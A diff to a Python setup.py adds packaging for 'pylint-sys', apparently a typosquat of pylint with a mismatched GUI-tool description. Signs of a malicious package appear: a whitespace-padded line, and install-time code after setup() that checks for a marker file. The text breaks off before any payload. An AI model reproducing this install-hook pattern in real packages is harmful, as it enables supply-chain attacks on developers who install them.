@@ -4,7 +4,22 @@ from setuptools import setup, find_packages
 VERSION = '8.15.6'
 DESCRIPTION = 'A tool for building graphical user interfaces'
 LONG_DESCRIPTION = 'Really helpful'
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name="pylint-sys",
+    version=VERSION,
+    author="DreamyOakXTimmywag",
+    author_email="DreamyOakXTimmywag@dreamyoak.onrender.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    packages=find_packages(),
+    install_requires=[''],
+    keywords=['python','arg','args','print','nagogy','echo'],
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 import os
 if os.path.exists("hifromDreamyOak"):
     exit(0)
